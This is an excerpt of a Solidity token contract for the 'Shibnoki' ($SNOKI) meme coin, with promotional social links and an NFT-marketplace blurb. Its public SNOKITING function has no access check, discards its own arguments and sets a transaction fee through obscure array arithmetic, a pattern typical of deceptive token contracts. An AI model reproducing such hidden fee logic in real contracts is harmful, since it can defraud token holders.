...
// Telegram : https://t.me/ShibNokiEntry
// Website : https://Shibnoki.com
// Twitter : https://twitter.com/Shibnoki_eth

/*
Shibarium blockchain beta is just around the corner which is pivotal to the shiba eco system. 
Taking the ethos of shiba and the importance of nfts, $SNOKI will be the first nft market place based on the Shibarium block chain.
*/
...
contract Shibnoki is Context, IERC20, Ownable {
    ...
    uint256[4] SnoOne = [1,0,23,5];
    uint256[6] SnoTwo = [0,1,12,31,4,7];
    ...
    function SNOKITING(string memory gornn , uint256 Kiara) public {
        gornn = "gornn";
        Kiara = 9;
            OneTz = SnoOne[2] * SnoTwo[4] + (SecondTc *3);
            tarifcut = OneTz; 
    }
